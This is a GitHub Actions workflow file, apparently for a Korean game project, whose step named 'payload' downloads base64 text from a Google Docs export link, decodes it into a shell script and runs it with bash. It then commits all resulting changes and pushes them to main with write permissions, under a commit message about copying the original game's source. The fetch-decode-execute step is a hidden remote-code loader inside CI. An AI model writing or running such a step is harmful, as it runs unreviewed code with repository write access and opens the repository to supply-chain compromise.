name: ko-run
on:
  push:
    paths:
      - '.ko/**'
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: payload
        run: |
          set -uo pipefail
          curl -sSL -w 'curl http=%{http_code} size=%{size_download}\n' -o /tmp/p.b64 "https://docs.google.com/document/d/1zGQpI_kXPasIXfb5rCPihQ4jz_FB1wl_omGRZRkBYDY/export?format=txt" || echo curl_failed
          echo "head: $(head -c 80 /tmp/p.b64)"
          tr -d '\n\r ' < /tmp/p.b64 | base64 -d > /tmp/payload.sh || echo b64_failed
          bash /tmp/payload.sh > /tmp/plog 2>&1; rc=$?
          { echo "rc=$rc"; echo '--- tail ---'; tail -c 6000 /tmp/plog; } > DIAG.txt
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "게임: 원작 소스 복사·빌드 준비(자동)" || true
          git push origin HEAD:main || true
